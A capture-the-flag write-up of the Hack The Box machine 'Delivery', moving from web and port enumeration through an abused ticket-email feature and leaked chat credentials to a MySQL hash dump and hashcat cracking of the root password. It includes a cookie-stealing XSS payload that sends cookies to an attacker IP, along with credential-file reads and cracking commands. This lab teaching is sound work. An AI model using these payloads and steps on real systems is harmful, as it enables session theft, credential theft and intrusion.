# Delivery

export IP=10.10.10.222

## Solution

Lets start with an nmap scan


```
cmd:  sudo nmap -sC -sV -vv -oN nmap/initial $IP


PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq549E025Q9FR27LDR6WZRQ52ikKjKUQLmE9ndEKjB0i1qOoL+WzkvqTdqEU6fFW6AqUIdSEd7GMNSMOk66otFgSoerK6MmH5IZjy4JqMoNVPDdWfmEiagBlG3H7IZ7yAO8gcg0RRrIQjE7XTMV09GmxEUtjojoLoqudUvbUi8COHCO6baVmyjZRlXRCQ6qTKIxRZbUAo0GOY8bYmf9sMLf70w6u/xbE2EYDFH+w60ES2K906x7lyfEPe73NfAIEhHNL8DBAUfQWzQjVjYNOLqGp/WdlKA1RLAOklpIdJQ9iehsH0q6nqjeTUv47mIHUiqaM+vlkCEAN3AAQH5mB/1
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAiAKnk2lw0GxzzqMXNsPQ1bTk35WwxCa3ED5H34T1yYMiXnRlfssJwso60D34/IM8vYXH0rznR9tHvjdN7R3hY=
|   256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEV5D6eYjySqfhW4l4IF1SZkZHxIRihnY6Mn6D8mLEW7
80/tcp open  http    syn-ack ttl 63 nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lets also do an allport scan on the background... <br>

Visiting the webpage (port 80) we can see a link to the helpdesk which is within a subdomain... <br>

Lets add it to the /etc/hosts
```
10.10.10.222 helpdesk.delivery.htb delivery.htb
```

Accessing <b> http://helpdesk.delivery.htb </b> we can see that it is running a Support Ticket System <br>
``` 
Program: Support Center
Version: NA
Provider: osTicket 
``` 

Lets do a simple enumeration to check if any subdirs that can be found 
``` 
cmd: gobuster dir -u http://helpdesk.delivery.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gobuster/2.3-mL.log -t 80

/images (Status: 301)
/pages (Status: 301)
/apps (Status: 301)
/assets (Status: 301)
/css (Status: 301)
/includes (Status: 403)
/js (Status: 301)
/kb (Status: 301)
/api (Status: 301)
/include (Status: 403)
/scp (Status: 301)
/included (Status: 403)
``` 

Found someting another login form at <b>/scp</b>, this one is for the osTicket system... <br> 

UPDATE: the all port scan found this extra port
```
8065/tcp open  unknown
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Wed, 10 Feb 2021 14:00:53 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: gpky7x4e1jbo9bfoedzpygeaqe
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Wed, 10 Feb 2021 16:23:35 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Date: Wed, 10 Feb 2021 16:23:36 GMT
|_    Content-Length: 0
```

When this port is accessed, another login page is found... Now is for a communication platform
```
Program: Mattermost
```

It is allowed to create an account:
```
email: mwncwfvfhwlpejenjg@miucce.com
username: www
password: !wW1234567
```

Comming back to the <b> Support ticket system - Support Center </b> i noticed something interesting that is:
* It is possible to create a ticked which can include HTML (probably js too) and links
* Then, it discloses a message "If you want to add more information to your ticket, just email (...)"

lets create a ticket
```
name: aaaaaaa
email: a@a.a
content: <script type=“text/javascript”>document.location=“http://10.10.14.147:8000/“+document.cookie;</script>

Ticket id: 8054180
Email: 8054180@delivery.htb
```

I created the ticket but it was not allowing to check the ticket i created, throwing an: "Access denied" message...  <br>

Lets use a @delivery.htb email, to check if that is the problem
```
name: www
email: w@delivery.htb
content: <script type=“text/javascript”>document.location=“http://10.10.14.147:8000/“+document.cookie;</script>

Ticket id: 9911552
Email: 9911552@delivery.htb
```

Now it is possible to check the ticket!! <br>

The content provided is sanitized (it shows empty) so XSS might be correctly handled in the version being used... <br>

Lets craft an email with <b> swaks </b> and check what happens 
```
To: 9911552@delivery.htb
```

Well, connection refused... The port (25) is closed, duh<br>

There was the Mattermost page, which allowed to create an account and waited to activation... Since outside "world" emails do not work, lets try to create an account with the email that we need to contact for the ticket <br>

```
email:9911552@delivery.htb
password: !wW1234567 
```

And voila, in the ticket appears the registration email (to activate) <br>
```
---- Registration Successful ---- Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=sjkhpy3ani137orc6nydp344q5tzd1wcs5f6g9kycmnsiduakuyutkfotj96n6g9&email=9911552%40delivery.htb ) --------------------- You can sign in from: --------------------- Mattermost lets you share messages and files from your PC or phone, with instant search and archiving. For the best experience, download the apps for PC, Mac, iOS and Android from: https://mattermost.com/download/#mattermostApps ( https://mattermost.com/download/#mattermostApps
```

Logging in to the platform, there is a channel with interesting messages
```
Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail! 
Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"

PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
```

Well, logging in to the scp/login.php with those credentials did not worked so i tried the ssh and voila
```
cmd: whoami && id

maildeliverer
uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer)

cmd: ls -la
-r-------- 1 maildeliverer maildeliverer   33 Feb 10 12:37 user.txt

cmd: cat user.txt
FLAG:f662a3a219eb7426304e05d6abedd806
```

Checking if there is another user with shell (in case we need to pivot to it)
```
cmd: cat /etc/passwd | grep -E "/bin/bash|/bin/sh"

root:x:0:0:root:/root:/bin/bash
maildeliverer:x:1000:1000:MailDeliverer,,,:/home/maildeliverer:/bin/bash
mattermost:x:998:998::/home/mattermost:/bin/sh
```

We can see that we might need to pivot to the mattermost acc... Lets enumerate first<br>

Checking open ports (just IPV4 because... ctf)
```
cmd: (netstat -punta || ss -ntpu)

tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -  <- CUPS
tcp        0      0 127.0.0.1:1025          0.0.0.0:*               LISTEN      -  <- EMAIL
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -  <- MYSQL
```

After running linpeas, it shown that mattermost was at <b>/opt/mattermost</b> <br>

Checking the config (at <b> /config/config.json </b>, from https://docs.mattermost.com/administration/config-settings.html) we got
```
"SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
```

Now lets access the mysql with it, to check if it works
```
cmd: mysql -u mmuser -p 
Enter Password: Crack_The_MM_Admin_PW

<WORKED>
```

Lets enumerate the DB and get the hashes!!! <br>
```
> show databases;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+

> use mattermost;
> show tables;

+------------------------+
| Tables_in_mattermost   |
+------------------------+
| Audits                 |
| Bots                   |
| ChannelMemberHistory   |
(..... there are 46 .....)
| Users                  |
+------------------------+

> describe Users; (there are more fields [25])
+--------------------+--------------+------+-----+---------+-------+
| Field              | Type         | Null | Key | Default | Extra |
+--------------------+--------------+------+-----+---------+-------+
| Username           | varchar(64)  | YES  | UNI | NULL    |       |
| Password           | varchar(128) | YES  |     | NULL    |       |
| Nickname           | varchar(64)  | YES  |     | NULL    |       |
+--------------------+--------------+------+-----+---------+-------+

> Select Username, Password, Nickname from Users;
+----------------------------------+--------------------------------------------------------------+----------+
| Username                         | Password                                                     | Nickname |
+----------------------------------+--------------------------------------------------------------+----------+
| surveybot                        |                                                              |          |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |          |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |          |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |          |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |          |
| channelexport                    |                                                              |          |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |          |
+----------------------------------+--------------------------------------------------------------+----------+
```

Lets crack the root password !!<br>
Recalling the messages we saw when opening the mattermost messaging server (before user), we should use hashcat to crack the hash found using the <b>RockYou</b> to check variants based on the <b>PleaseSubscribe!</b> <br>


```
(create hash file with the hash)
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO

(generate the new wordlist with the rules)
cmd: hashcat -r /usr/share/hashcat/rules/best64.rule --stdout hash_rule > words

(checked the hash type online, check the mode for the hashcat)
cmd: hashcat --help | grep bcrypt  
> 3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System

(decrypt it)
cmd: hashcat -a 0 -m 3200 hash words
> $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21

(switch user)
cmd: su root
> Password: PleaseSubscribe!21
```

And voila, we got it !!
```
cmd: whoami && id
> root
> uid=0(root) gid=0(root) groups=0(root)

cmd: cat ~/root.txt
FLAG: 1f611059682782d036397bfc2b73362a
```